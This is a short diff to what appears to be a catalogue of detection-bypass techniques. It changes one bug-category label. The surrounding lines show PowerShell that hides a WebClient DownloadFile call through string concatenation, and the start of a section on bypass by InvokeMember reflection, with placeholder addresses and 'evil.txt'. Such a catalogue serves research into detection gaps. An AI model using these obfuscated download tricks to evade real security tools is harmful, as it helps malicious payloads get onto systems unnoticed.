@@ -53,7 +53,7 @@ $wc.("Download" + "File")($url,"DIRECTORY_TO_WRITE_TO\evil.txt")
 
 ### Bypass 3: InvokeMember Reflection
 
-**Bug Categories:** ADE1-01 + ADE2-01 (Omit Alternative API/Function)
+**Bug Categories:** ADE1-01 + ADE2-01 (Omit Alternative Method/Binary)
 
 ```PowerShell
 $url = "ADDRESS\evil.txt";
